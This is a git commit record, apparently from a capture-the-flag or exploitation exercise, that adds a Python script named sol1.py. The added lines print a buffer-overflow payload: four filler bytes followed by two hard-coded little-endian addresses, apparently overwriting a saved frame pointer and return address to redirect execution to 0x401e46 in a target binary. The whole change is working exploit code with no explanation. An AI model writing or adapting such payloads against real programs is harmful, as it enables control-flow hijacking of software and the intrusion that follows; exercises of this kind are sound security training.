0a28b5856f1d3286b110722503077b5d58e45cbe
jordynk <jordyn13470@gmail.com>
2024-04-01 19:06:05 +0000

    sol1

--- sol1.py
+++ sol1.py
@@ -1,3 +1,8 @@
 #!/usr/bin/env python3
 
 import sys
+
+
+sys.stdout.buffer.write(b'A'*4)
+sys.stdout.buffer.write(0x7ffffff6ae40.to_bytes(8, 'little'))
+sys.stdout.buffer.write(0x401e46.to_bytes(8, 'little'))
